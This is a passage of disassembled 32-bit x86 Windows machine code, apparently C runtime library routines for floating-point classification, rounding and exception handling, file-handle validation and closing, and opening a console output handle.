  409a44:	be ff ff 00 00       	mov    $0xffff,%esi
  409a49:	56                   	push   %esi
  409a4a:	68 3f 1b 00 00       	push   $0x1b3f
  409a4f:	e8 14 e5 ff ff       	call   0x407f68
  409a54:	dd 45 08             	fldl   0x8(%ebp)
  409a57:	8b d8                	mov    %eax,%ebx
  409a59:	59                   	pop    %ecx
  409a5a:	59                   	pop    %ecx
  409a5b:	0f b7 4d 0e          	movzwl 0xe(%ebp),%ecx
  409a5f:	b8 f0 7f 00 00       	mov    $0x7ff0,%eax
  409a64:	23 c8                	and    %eax,%ecx
  409a66:	51                   	push   %ecx
  409a67:	51                   	push   %ecx
  409a68:	dd 1c 24             	fstpl  (%esp)
  409a6b:	66 3b c8             	cmp    %ax,%cx
  409a6e:	75 37                	jne    0x409aa7
  409a70:	e8 35 0d 00 00       	call   0x40a7aa
  409a75:	48                   	dec    %eax
  409a76:	59                   	pop    %ecx
  409a77:	59                   	pop    %ecx
  409a78:	83 f8 02             	cmp    $0x2,%eax
  409a7b:	77 0e                	ja     0x409a8b
  409a7d:	56                   	push   %esi
  409a7e:	53                   	push   %ebx
  409a7f:	e8 e4 e4 ff ff       	call   0x407f68
  409a84:	dd 45 08             	fldl   0x8(%ebp)
  409a87:	59                   	pop    %ecx
  409a88:	59                   	pop    %ecx
  409a89:	eb 63                	jmp    0x409aee
  409a8b:	dd 45 08             	fldl   0x8(%ebp)
  409a8e:	dd 05 00 00 41 00    	fldl   0x410000
  409a94:	53                   	push   %ebx
  409a95:	83 ec 10             	sub    $0x10,%esp
  409a98:	d8 c1                	fadd   %st(1),%st
  409a9a:	dd 5c 24 08          	fstpl  0x8(%esp)
  409a9e:	dd 1c 24             	fstpl  (%esp)
  409aa1:	6a 0c                	push   $0xc
  409aa3:	6a 08                	push   $0x8
  409aa5:	eb 3f                	jmp    0x409ae6
  409aa7:	e8 1e 05 00 00       	call   0x409fca
  409aac:	dd 55 f8             	fstl   -0x8(%ebp)
  409aaf:	dd 45 08             	fldl   0x8(%ebp)
  409ab2:	83 c4 08             	add    $0x8,%esp
  409ab5:	dd e1                	fucom  %st(1)
  409ab7:	df e0                	fnstsw %ax
  409ab9:	f6 c4 44             	test   $0x44,%ah
  409abc:	7a 12                	jp     0x409ad0
  409abe:	56                   	push   %esi
  409abf:	dd d9                	fstp   %st(1)
  409ac1:	53                   	push   %ebx
  409ac2:	dd d8                	fstp   %st(0)
  409ac4:	e8 9f e4 ff ff       	call   0x407f68
  409ac9:	dd 45 f8             	fldl   -0x8(%ebp)
  409acc:	59                   	pop    %ecx
  409acd:	59                   	pop    %ecx
  409ace:	eb 1e                	jmp    0x409aee
  409ad0:	f6 c3 20             	test   $0x20,%bl
  409ad3:	75 e9                	jne    0x409abe
  409ad5:	53                   	push   %ebx
  409ad6:	83 ec 10             	sub    $0x10,%esp
  409ad9:	d9 c9                	fxch   %st(1)
  409adb:	dd 5c 24 08          	fstpl  0x8(%esp)
  409adf:	dd 1c 24             	fstpl  (%esp)
  409ae2:	6a 0c                	push   $0xc
  409ae4:	6a 10                	push   $0x10
  409ae6:	e8 29 05 00 00       	call   0x40a014
  409aeb:	83 c4 1c             	add    $0x1c,%esp
  409aee:	5e                   	pop    %esi
  409aef:	5b                   	pop    %ebx
  409af0:	8b e5                	mov    %ebp,%esp
  409af2:	5d                   	pop    %ebp
  409af3:	c3                   	ret
  409af4:	6a 0c                	push   $0xc
  409af6:	68 10 1a 41 00       	push   $0x411a10
  409afb:	e8 10 86 ff ff       	call   0x402110
  409b00:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  409b04:	8b 45 08             	mov    0x8(%ebp),%eax
  409b07:	ff 30                	push   (%eax)
  409b09:	e8 93 c1 ff ff       	call   0x405ca1
  409b0e:	59                   	pop    %ecx
  409b0f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409b13:	8b 45 0c             	mov    0xc(%ebp),%eax
  409b16:	8b 00                	mov    (%eax),%eax
  409b18:	8b 30                	mov    (%eax),%esi
  409b1a:	8b d6                	mov    %esi,%edx
  409b1c:	c1 fa 06             	sar    $0x6,%edx
  409b1f:	8b c6                	mov    %esi,%eax
  409b21:	83 e0 3f             	and    $0x3f,%eax
  409b24:	6b c8 30             	imul   $0x30,%eax,%ecx
  409b27:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  409b2e:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  409b33:	74 0b                	je     0x409b40
  409b35:	56                   	push   %esi
  409b36:	e8 e2 00 00 00       	call   0x409c1d
  409b3b:	59                   	pop    %ecx
  409b3c:	8b f0                	mov    %eax,%esi
  409b3e:	eb 0e                	jmp    0x409b4e
  409b40:	e8 f6 ac ff ff       	call   0x40483b
  409b45:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409b4b:	83 ce ff             	or     $0xffffffff,%esi
  409b4e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  409b51:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409b58:	e8 0d 00 00 00       	call   0x409b6a
  409b5d:	8b c6                	mov    %esi,%eax
  409b5f:	e8 f2 85 ff ff       	call   0x402156
  409b64:	c2 0c 00             	ret    $0xc
  409b67:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  409b6a:	8b 45 10             	mov    0x10(%ebp),%eax
  409b6d:	ff 30                	push   (%eax)
  409b6f:	e8 50 c1 ff ff       	call   0x405cc4
  409b74:	59                   	pop    %ecx
  409b75:	c3                   	ret
  409b76:	8b ff                	mov    %edi,%edi
  409b78:	55                   	push   %ebp
  409b79:	8b ec                	mov    %esp,%ebp
  409b7b:	83 ec 0c             	sub    $0xc,%esp
  409b7e:	8b 45 08             	mov    0x8(%ebp),%eax
  409b81:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  409b84:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409b87:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409b8a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409b8d:	50                   	push   %eax
  409b8e:	ff 75 0c             	push   0xc(%ebp)
  409b91:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409b94:	50                   	push   %eax
  409b95:	e8 5a ff ff ff       	call   0x409af4
  409b9a:	8b e5                	mov    %ebp,%esp
  409b9c:	5d                   	pop    %ebp
  409b9d:	c3                   	ret
  409b9e:	8b ff                	mov    %edi,%edi
  409ba0:	55                   	push   %ebp
  409ba1:	8b ec                	mov    %esp,%ebp
  409ba3:	51                   	push   %ecx
  409ba4:	56                   	push   %esi
  409ba5:	8b 75 08             	mov    0x8(%ebp),%esi
  409ba8:	83 fe fe             	cmp    $0xfffffffe,%esi
  409bab:	75 15                	jne    0x409bc2
  409bad:	e8 76 ac ff ff       	call   0x404828
  409bb2:	83 20 00             	andl   $0x0,(%eax)
  409bb5:	e8 81 ac ff ff       	call   0x40483b
  409bba:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409bc0:	eb 53                	jmp    0x409c15
  409bc2:	85 f6                	test   %esi,%esi
  409bc4:	78 37                	js     0x409bfd
  409bc6:	3b 35 50 42 41 00    	cmp    0x414250,%esi
  409bcc:	73 2f                	jae    0x409bfd
  409bce:	8b c6                	mov    %esi,%eax
  409bd0:	8b d6                	mov    %esi,%edx
  409bd2:	83 e0 3f             	and    $0x3f,%eax
  409bd5:	c1 fa 06             	sar    $0x6,%edx
  409bd8:	6b c8 30             	imul   $0x30,%eax,%ecx
  409bdb:	8b 04 95 50 40 41 00 	mov    0x414050(,%edx,4),%eax
  409be2:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  409be7:	74 14                	je     0x409bfd
  409be9:	8d 45 08             	lea    0x8(%ebp),%eax
  409bec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409bef:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409bf2:	50                   	push   %eax
  409bf3:	56                   	push   %esi
  409bf4:	e8 7d ff ff ff       	call   0x409b76
  409bf9:	59                   	pop    %ecx
  409bfa:	59                   	pop    %ecx
  409bfb:	eb 1b                	jmp    0x409c18
  409bfd:	e8 26 ac ff ff       	call   0x404828
  409c02:	83 20 00             	andl   $0x0,(%eax)
  409c05:	e8 31 ac ff ff       	call   0x40483b
  409c0a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409c10:	e8 2e aa ff ff       	call   0x404643
  409c15:	83 c8 ff             	or     $0xffffffff,%eax
  409c18:	5e                   	pop    %esi
  409c19:	8b e5                	mov    %ebp,%esp
  409c1b:	5d                   	pop    %ebp
  409c1c:	c3                   	ret
  409c1d:	8b ff                	mov    %edi,%edi
  409c1f:	55                   	push   %ebp
  409c20:	8b ec                	mov    %esp,%ebp
  409c22:	56                   	push   %esi
  409c23:	57                   	push   %edi
  409c24:	8b 7d 08             	mov    0x8(%ebp),%edi
  409c27:	57                   	push   %edi
  409c28:	e8 4b c1 ff ff       	call   0x405d78
  409c2d:	59                   	pop    %ecx
  409c2e:	83 f8 ff             	cmp    $0xffffffff,%eax
  409c31:	75 04                	jne    0x409c37
  409c33:	33 f6                	xor    %esi,%esi
  409c35:	eb 4e                	jmp    0x409c85
  409c37:	a1 50 40 41 00       	mov    0x414050,%eax
  409c3c:	83 ff 01             	cmp    $0x1,%edi
  409c3f:	75 09                	jne    0x409c4a
  409c41:	f6 80 88 00 00 00 01 	testb  $0x1,0x88(%eax)
  409c48:	75 0b                	jne    0x409c55
  409c4a:	83 ff 02             	cmp    $0x2,%edi
  409c4d:	75 1c                	jne    0x409c6b
  409c4f:	f6 40 58 01          	testb  $0x1,0x58(%eax)
  409c53:	74 16                	je     0x409c6b
  409c55:	6a 02                	push   $0x2
  409c57:	e8 1c c1 ff ff       	call   0x405d78
  409c5c:	6a 01                	push   $0x1
  409c5e:	8b f0                	mov    %eax,%esi
  409c60:	e8 13 c1 ff ff       	call   0x405d78
  409c65:	59                   	pop    %ecx
  409c66:	59                   	pop    %ecx
  409c67:	3b c6                	cmp    %esi,%eax
  409c69:	74 c8                	je     0x409c33
  409c6b:	57                   	push   %edi
  409c6c:	e8 07 c1 ff ff       	call   0x405d78
  409c71:	59                   	pop    %ecx
  409c72:	50                   	push   %eax
  409c73:	ff 15 30 c0 40 00    	call   *0x40c030
  409c79:	85 c0                	test   %eax,%eax
  409c7b:	75 b6                	jne    0x409c33
  409c7d:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  409c83:	8b f0                	mov    %eax,%esi
  409c85:	57                   	push   %edi
  409c86:	e8 5c c0 ff ff       	call   0x405ce7
  409c8b:	59                   	pop    %ecx
  409c8c:	8b cf                	mov    %edi,%ecx
  409c8e:	83 e7 3f             	and    $0x3f,%edi
  409c91:	c1 f9 06             	sar    $0x6,%ecx
  409c94:	6b d7 30             	imul   $0x30,%edi,%edx
  409c97:	8b 0c 8d 50 40 41 00 	mov    0x414050(,%ecx,4),%ecx
  409c9e:	c6 44 11 28 00       	movb   $0x0,0x28(%ecx,%edx,1)
  409ca3:	85 f6                	test   %esi,%esi
  409ca5:	74 0c                	je     0x409cb3
  409ca7:	56                   	push   %esi
  409ca8:	e8 58 ab ff ff       	call   0x404805
  409cad:	59                   	pop    %ecx
  409cae:	83 c8 ff             	or     $0xffffffff,%eax
  409cb1:	eb 02                	jmp    0x409cb5
  409cb3:	33 c0                	xor    %eax,%eax
  409cb5:	5f                   	pop    %edi
  409cb6:	5e                   	pop    %esi
  409cb7:	5d                   	pop    %ebp
  409cb8:	c3                   	ret
  409cb9:	8b ff                	mov    %edi,%edi
  409cbb:	55                   	push   %ebp
  409cbc:	8b ec                	mov    %esp,%ebp
  409cbe:	8b 45 08             	mov    0x8(%ebp),%eax
  409cc1:	33 c9                	xor    %ecx,%ecx
  409cc3:	89 08                	mov    %ecx,(%eax)
  409cc5:	8b 45 08             	mov    0x8(%ebp),%eax
  409cc8:	89 48 04             	mov    %ecx,0x4(%eax)
  409ccb:	8b 45 08             	mov    0x8(%ebp),%eax
  409cce:	89 48 08             	mov    %ecx,0x8(%eax)
  409cd1:	8b 45 08             	mov    0x8(%ebp),%eax
  409cd4:	83 48 10 ff          	orl    $0xffffffff,0x10(%eax)
  409cd8:	8b 45 08             	mov    0x8(%ebp),%eax
  409cdb:	89 48 14             	mov    %ecx,0x14(%eax)
  409cde:	8b 45 08             	mov    0x8(%ebp),%eax
  409ce1:	89 48 18             	mov    %ecx,0x18(%eax)
  409ce4:	8b 45 08             	mov    0x8(%ebp),%eax
  409ce7:	89 48 1c             	mov    %ecx,0x1c(%eax)
  409cea:	8b 45 08             	mov    0x8(%ebp),%eax
  409ced:	83 c0 0c             	add    $0xc,%eax
  409cf0:	87 08                	xchg   %ecx,(%eax)
  409cf2:	5d                   	pop    %ebp
  409cf3:	c3                   	ret
  409cf4:	33 c0                	xor    %eax,%eax
  409cf6:	50                   	push   %eax
  409cf7:	50                   	push   %eax
  409cf8:	6a 03                	push   $0x3
  409cfa:	50                   	push   %eax
  409cfb:	6a 03                	push   $0x3
  409cfd:	68 00 00 00 40       	push   $0x40000000
  409d02:	68 08 00 41 00       	push   $0x410008
  409d07:	ff 15 40 c0 40 00    	call   *0x40c040
  409d0d:	a3 60 37 41 00       	mov    %eax,0x413760
  409d12:	c3                   	ret
  409d13:	a1 60 37 41 00       	mov    0x413760,%eax
  409d18:	83 f8 ff             	cmp    $0xffffffff,%eax
  409d1b:	74 0c                	je     0x409d29
  409d1d:	83 f8 fe             	cmp    $0xfffffffe,%eax
  409d20:	74 07                	je     0x409d29
  409d22:	50                   	push   %eax
  409d23:	ff 15 30 c0 40 00    	call   *0x40c030
  409d29:	c3                   	ret
  409d2a:	8b ff                	mov    %edi,%edi
  409d2c:	55                   	push   %ebp
  409d2d:	8b ec                	mov    %esp,%ebp
  409d2f:	51                   	push   %ecx
  409d30:	51                   	push   %ecx
  409d31:	dd 45 08             	fldl   0x8(%ebp)
  409d34:	51                   	push   %ecx
  409d35:	51                   	push   %ecx
  409d36:	dd 1c 24             	fstpl  (%esp)
  409d39:	e8 ca 0a 00 00       	call   0x40a808
  409d3e:	59                   	pop    %ecx
  409d3f:	59                   	pop    %ecx
  409d40:	a8 90                	test   $0x90,%al
  409d42:	75 4a                	jne    0x409d8e
  409d44:	dd 45 08             	fldl   0x8(%ebp)
  409d47:	51                   	push   %ecx
  409d48:	51                   	push   %ecx
  409d49:	dd 1c 24             	fstpl  (%esp)
  409d4c:	e8 79 02 00 00       	call   0x409fca
  409d51:	dd 45 08             	fldl   0x8(%ebp)
  409d54:	dd e1                	fucom  %st(1)
  409d56:	df e0                	fnstsw %ax
  409d58:	59                   	pop    %ecx
  409d59:	59                   	pop    %ecx
  409d5a:	dd d9                	fstp   %st(1)
  409d5c:	f6 c4 44             	test   $0x44,%ah
  409d5f:	7a 2b                	jp     0x409d8c
  409d61:	dc 0d 40 08 41 00    	fmull  0x410840
  409d67:	51                   	push   %ecx
  409d68:	51                   	push   %ecx
  409d69:	dd 55 f8             	fstl   -0x8(%ebp)
  409d6c:	dd 1c 24             	fstpl  (%esp)
  409d6f:	e8 56 02 00 00       	call   0x409fca
  409d74:	dd 45 f8             	fldl   -0x8(%ebp)
  409d77:	da e9                	fucompp
  409d79:	df e0                	fnstsw %ax
  409d7b:	59                   	pop    %ecx
  409d7c:	59                   	pop    %ecx
  409d7d:	f6 c4 44             	test   $0x44,%ah
  409d80:	7a 05                	jp     0x409d87
  409d82:	6a 02                	push   $0x2
  409d84:	58                   	pop    %eax
  409d85:	eb 09                	jmp    0x409d90
  409d87:	33 c0                	xor    %eax,%eax
  409d89:	40                   	inc    %eax
  409d8a:	eb 04                	jmp    0x409d90
  409d8c:	dd d8                	fstp   %st(0)
  409d8e:	33 c0                	xor    %eax,%eax
  409d90:	8b e5                	mov    %ebp,%esp
  409d92:	5d                   	pop    %ebp
  409d93:	c3                   	ret
  409d94:	8b ff                	mov    %edi,%edi
  409d96:	55                   	push   %ebp
  409d97:	8b ec                	mov    %esp,%ebp
  409d99:	dd 45 08             	fldl   0x8(%ebp)
  409d9c:	b9 00 00 f0 7f       	mov    $0x7ff00000,%ecx
  409da1:	d9 e1                	fabs
  409da3:	b8 00 00 f0 ff       	mov    $0xfff00000,%eax
  409da8:	39 4d 14             	cmp    %ecx,0x14(%ebp)
  409dab:	75 3b                	jne    0x409de8
  409dad:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  409db1:	75 75                	jne    0x409e28
  409db3:	d9 e8                	fld1
  409db5:	d8 d1                	fcom   %st(1)
  409db7:	df e0                	fnstsw %ax
  409db9:	f6 c4 05             	test   $0x5,%ah
  409dbc:	7a 0f                	jp     0x409dcd
  409dbe:	dd d9                	fstp   %st(1)
  409dc0:	dd d8                	fstp   %st(0)
  409dc2:	dd 05 d0 09 41 00    	fldl   0x4109d0
  409dc8:	e9 e9 00 00 00       	jmp    0x409eb6
  409dcd:	d8 d1                	fcom   %st(1)
  409dcf:	df e0                	fnstsw %ax
  409dd1:	dd d9                	fstp   %st(1)
  409dd3:	f6 c4 41             	test   $0x41,%ah
  409dd6:	8b 45 18             	mov    0x18(%ebp),%eax
  409dd9:	0f 85 da 00 00 00    	jne    0x409eb9
  409ddf:	dd d8                	fstp   %st(0)
  409de1:	d9 ee                	fldz
  409de3:	e9 d1 00 00 00       	jmp    0x409eb9
  409de8:	39 45 14             	cmp    %eax,0x14(%ebp)
  409deb:	75 3b                	jne    0x409e28
  409ded:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  409df1:	75 35                	jne    0x409e28
  409df3:	d9 e8                	fld1
  409df5:	d8 d1                	fcom   %st(1)
  409df7:	df e0                	fnstsw %ax
  409df9:	f6 c4 05             	test   $0x5,%ah
  409dfc:	7a 0b                	jp     0x409e09
  409dfe:	dd d9                	fstp   %st(1)
  409e00:	dd d8                	fstp   %st(0)
  409e02:	d9 ee                	fldz
  409e04:	e9 ad 00 00 00       	jmp    0x409eb6
  409e09:	d8 d1                	fcom   %st(1)
  409e0b:	df e0                	fnstsw %ax
  409e0d:	dd d9                	fstp   %st(1)
  409e0f:	f6 c4 41             	test   $0x41,%ah
  409e12:	8b 45 18             	mov    0x18(%ebp),%eax
  409e15:	0f 85 9e 00 00 00    	jne    0x409eb9
  409e1b:	dd d8                	fstp   %st(0)
  409e1d:	dd 05 d0 09 41 00    	fldl   0x4109d0
  409e23:	e9 91 00 00 00       	jmp    0x409eb9
  409e28:	dd d8                	fstp   %st(0)
  409e2a:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  409e2d:	75 2e                	jne    0x409e5d
  409e2f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  409e33:	0f 85 82 00 00 00    	jne    0x409ebb
  409e39:	d9 ee                	fldz
  409e3b:	dd 45 10             	fldl   0x10(%ebp)
  409e3e:	d8 d1                	fcom   %st(1)
  409e40:	df e0                	fnstsw %ax
  409e42:	f6 c4 41             	test   $0x41,%ah
  409e45:	0f 84 73 ff ff ff    	je     0x409dbe
  409e4b:	d8 d9                	fcomp  %st(1)
  409e4d:	df e0                	fnstsw %ax
  409e4f:	f6 c4 05             	test   $0x5,%ah
  409e52:	8b 45 18             	mov    0x18(%ebp),%eax
  409e55:	7b 62                	jnp    0x409eb9
  409e57:	dd d8                	fstp   %st(0)
  409e59:	d9 e8                	fld1
  409e5b:	eb 5c                	jmp    0x409eb9
  409e5d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  409e60:	75 59                	jne    0x409ebb
  409e62:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  409e66:	75 53                	jne    0x409ebb
  409e68:	dd 45 10             	fldl   0x10(%ebp)
  409e6b:	51                   	push   %ecx
  409e6c:	51                   	push   %ecx
  409e6d:	dd 1c 24             	fstpl  (%esp)
  409e70:	e8 b5 fe ff ff       	call   0x409d2a
  409e75:	d9 ee                	fldz
  409e77:	dd 45 10             	fldl   0x10(%ebp)
  409e7a:	59                   	pop    %ecx
  409e7b:	59                   	pop    %ecx
  409e7c:	d8 d1                	fcom   %st(1)
  409e7e:	8b c8                	mov    %eax,%ecx
  409e80:	df e0                	fnstsw %ax
  409e82:	f6 c4 41             	test   $0x41,%ah
  409e85:	75 13                	jne    0x409e9a
  409e87:	dd d9                	fstp   %st(1)
  409e89:	dd d8                	fstp   %st(0)
  409e8b:	dd 05 d0 09 41 00    	fldl   0x4109d0
  409e91:	83 f9 01             	cmp    $0x1,%ecx
  409e94:	75 20                	jne    0x409eb6
  409e96:	d9 e0                	fchs
  409e98:	eb 1c                	jmp    0x409eb6
  409e9a:	d8 d9                	fcomp  %st(1)
  409e9c:	df e0                	fnstsw %ax
  409e9e:	f6 c4 05             	test   $0x5,%ah
  409ea1:	7a 0f                	jp     0x409eb2
  409ea3:	83 f9 01             	cmp    $0x1,%ecx
  409ea6:	75 0e                	jne    0x409eb6
  409ea8:	dd d8                	fstp   %st(0)
  409eaa:	dd 05 e0 09 41 00    	fldl   0x4109e0
  409eb0:	eb 04                	jmp    0x409eb6
  409eb2:	dd d8                	fstp   %st(0)
  409eb4:	d9 e8                	fld1
  409eb6:	8b 45 18             	mov    0x18(%ebp),%eax
  409eb9:	dd 18                	fstpl  (%eax)
  409ebb:	33 c0                	xor    %eax,%eax
  409ebd:	5d                   	pop    %ebp
  409ebe:	c3                   	ret
  409ebf:	8b ff                	mov    %edi,%edi
  409ec1:	53                   	push   %ebx
  409ec2:	8b dc                	mov    %esp,%ebx
  409ec4:	51                   	push   %ecx
  409ec5:	51                   	push   %ecx
  409ec6:	83 e4 f0             	and    $0xfffffff0,%esp
  409ec9:	83 c4 04             	add    $0x4,%esp
  409ecc:	55                   	push   %ebp
  409ecd:	8b 6b 04             	mov    0x4(%ebx),%ebp
  409ed0:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  409ed4:	8b ec                	mov    %esp,%ebp
  409ed6:	81 ec 88 00 00 00    	sub    $0x88,%esp
  409edc:	a1 04 30 41 00       	mov    0x413004,%eax
  409ee1:	33 c5                	xor    %ebp,%eax
  409ee3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409ee6:	8b 43 10             	mov    0x10(%ebx),%eax
  409ee9:	56                   	push   %esi
  409eea:	8b 73 0c             	mov    0xc(%ebx),%esi
  409eed:	57                   	push   %edi
  409eee:	0f b7 08             	movzwl (%eax),%ecx
  409ef1:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  409ef7:	8b 06                	mov    (%esi),%eax
  409ef9:	83 e8 01             	sub    $0x1,%eax
  409efc:	74 29                	je     0x409f27
  409efe:	83 e8 01             	sub    $0x1,%eax
  409f01:	74 20                	je     0x409f23
  409f03:	83 e8 01             	sub    $0x1,%eax
  409f06:	74 17                	je     0x409f1f
  409f08:	83 e8 01             	sub    $0x1,%eax
  409f0b:	74 0e                	je     0x409f1b
  409f0d:	83 e8 01             	sub    $0x1,%eax
  409f10:	74 15                	je     0x409f27
  409f12:	83 e8 03             	sub    $0x3,%eax
  409f15:	75 72                	jne    0x409f89
  409f17:	6a 10                	push   $0x10
  409f19:	eb 0e                	jmp    0x409f29
  409f1b:	6a 12                	push   $0x12
  409f1d:	eb 0a                	jmp    0x409f29
  409f1f:	6a 11                	push   $0x11
  409f21:	eb 06                	jmp    0x409f29
  409f23:	6a 04                	push   $0x4
  409f25:	eb 02                	jmp    0x409f29
  409f27:	6a 08                	push   $0x8
  409f29:	5f                   	pop    %edi
  409f2a:	51                   	push   %ecx
  409f2b:	8d 46 18             	lea    0x18(%esi),%eax
  409f2e:	50                   	push   %eax
  409f2f:	57                   	push   %edi
  409f30:	e8 ad 01 00 00       	call   0x40a0e2
  409f35:	83 c4 0c             	add    $0xc,%esp
  409f38:	85 c0                	test   %eax,%eax
  409f3a:	75 47                	jne    0x409f83
  409f3c:	8b 4b 08             	mov    0x8(%ebx),%ecx
  409f3f:	83 f9 10             	cmp    $0x10,%ecx
  409f42:	74 10                	je     0x409f54
  409f44:	83 f9 16             	cmp    $0x16,%ecx
  409f47:	74 0b                	je     0x409f54
  409f49:	83 f9 1d             	cmp    $0x1d,%ecx
  409f4c:	74 06                	je     0x409f54
  409f4e:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  409f52:	eb 12                	jmp    0x409f66
  409f54:	8b 45 c0             	mov    -0x40(%ebp),%eax
  409f57:	dd 46 10             	fldl   0x10(%esi)
  409f5a:	83 e0 e3             	and    $0xffffffe3,%eax
  409f5d:	83 c8 03             	or     $0x3,%eax
  409f60:	dd 5d b0             	fstpl  -0x50(%ebp)
  409f63:	89 45 c0             	mov    %eax,-0x40(%ebp)
  409f66:	8d 46 18             	lea    0x18(%esi),%eax
  409f69:	50                   	push   %eax
  409f6a:	8d 46 08             	lea    0x8(%esi),%eax
  409f6d:	50                   	push   %eax
  409f6e:	51                   	push   %ecx
  409f6f:	57                   	push   %edi
  409f70:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  409f76:	50                   	push   %eax
  409f77:	8d 45 80             	lea    -0x80(%ebp),%eax
  409f7a:	50                   	push   %eax
  409f7b:	e8 42 03 00 00       	call   0x40a2c2
  409f80:	83 c4 18             	add    $0x18,%esp
  409f83:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
  409f89:	68 ff ff 00 00       	push   $0xffff
  409f8e:	51                   	push   %ecx
  409f8f:	e8 d4 df ff ff       	call   0x407f68
  409f94:	83 3e 08             	cmpl   $0x8,(%esi)
  409f97:	59                   	pop    %ecx
  409f98:	59                   	pop    %ecx
  409f99:	74 14                	je     0x409faf
  409f9b:	e8 6f 8e ff ff       	call   0x402e0f
  409fa0:	84 c0                	test   %al,%al
  409fa2:	74 0b                	je     0x409faf
  409fa4:	56                   	push   %esi
  409fa5:	e8 92 8e ff ff       	call   0x402e3c
  409faa:	59                   	pop    %ecx
  409fab:	85 c0                	test   %eax,%eax
  409fad:	75 08                	jne    0x409fb7
  409faf:	ff 36                	push   (%esi)
  409fb1:	e8 20 06 00 00       	call   0x40a5d6
  409fb6:	59                   	pop    %ecx
  409fb7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409fba:	5f                   	pop    %edi
  409fbb:	33 cd                	xor    %ebp,%ecx
  409fbd:	5e                   	pop    %esi
  409fbe:	e8 05 78 ff ff       	call   0x4017c8
  409fc3:	8b e5                	mov    %ebp,%esp
  409fc5:	5d                   	pop    %ebp
  409fc6:	8b e3                	mov    %ebx,%esp
  409fc8:	5b                   	pop    %ebx
  409fc9:	c3                   	ret
  409fca:	8b ff                	mov    %edi,%edi
  409fcc:	55                   	push   %ebp
  409fcd:	8b ec                	mov    %esp,%ebp
  409fcf:	51                   	push   %ecx
  409fd0:	51                   	push   %ecx
  409fd1:	dd 45 08             	fldl   0x8(%ebp)
  409fd4:	d9 fc                	frndint
  409fd6:	dd 5d f8             	fstpl  -0x8(%ebp)
  409fd9:	dd 45 f8             	fldl   -0x8(%ebp)
  409fdc:	8b e5                	mov    %ebp,%esp
  409fde:	5d                   	pop    %ebp
  409fdf:	c3                   	ret
  409fe0:	8b ff                	mov    %edi,%edi
  409fe2:	55                   	push   %ebp
  409fe3:	8b ec                	mov    %esp,%ebp
  409fe5:	8b 45 08             	mov    0x8(%ebp),%eax
  409fe8:	a8 20                	test   $0x20,%al
  409fea:	74 04                	je     0x409ff0
  409fec:	6a 05                	push   $0x5
  409fee:	eb 17                	jmp    0x40a007
  409ff0:	a8 08                	test   $0x8,%al
  409ff2:	74 05                	je     0x409ff9
  409ff4:	33 c0                	xor    %eax,%eax
  409ff6:	40                   	inc    %eax
  409ff7:	5d                   	pop    %ebp
  409ff8:	c3                   	ret
  409ff9:	a8 04                	test   $0x4,%al
  409ffb:	74 04                	je     0x40a001
  409ffd:	6a 02                	push   $0x2
  409fff:	eb 06                	jmp    0x40a007
  40a001:	a8 01                	test   $0x1,%al
  40a003:	74 05                	je     0x40a00a
  40a005:	6a 03                	push   $0x3
  40a007:	58                   	pop    %eax
  40a008:	5d                   	pop    %ebp
  40a009:	c3                   	ret
  40a00a:	0f b6 c0             	movzbl %al,%eax
  40a00d:	83 e0 02             	and    $0x2,%eax
  40a010:	03 c0                	add    %eax,%eax
  40a012:	5d                   	pop    %ebp
  40a013:	c3                   	ret
  40a014:	8b ff                	mov    %edi,%edi
  40a016:	53                   	push   %ebx
  40a017:	8b dc                	mov    %esp,%ebx
  40a019:	51                   	push   %ecx
  40a01a:	51                   	push   %ecx
  40a01b:	83 e4 f0             	and    $0xfffffff0,%esp
  40a01e:	83 c4 04             	add    $0x4,%esp
  40a021:	55                   	push   %ebp
  40a022:	8b 6b 04             	mov    0x4(%ebx),%ebp
  40a025:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40a029:	8b ec                	mov    %esp,%ebp
  40a02b:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40a031:	a1 04 30 41 00       	mov    0x413004,%eax
  40a036:	33 c5                	xor    %ebp,%eax
  40a038:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a03b:	56                   	push   %esi
  40a03c:	8b 73 20             	mov    0x20(%ebx),%esi
  40a03f:	8d 43 18             	lea    0x18(%ebx),%eax
  40a042:	57                   	push   %edi
  40a043:	56                   	push   %esi
  40a044:	50                   	push   %eax
  40a045:	ff 73 08             	push   0x8(%ebx)
  40a048:	e8 95 00 00 00       	call   0x40a0e2
  40a04d:	83 c4 0c             	add    $0xc,%esp
  40a050:	85 c0                	test   %eax,%eax
  40a052:	75 26                	jne    0x40a07a
  40a054:	83 65 c0 fe          	andl   $0xfffffffe,-0x40(%ebp)
  40a058:	50                   	push   %eax
  40a059:	8d 43 18             	lea    0x18(%ebx),%eax
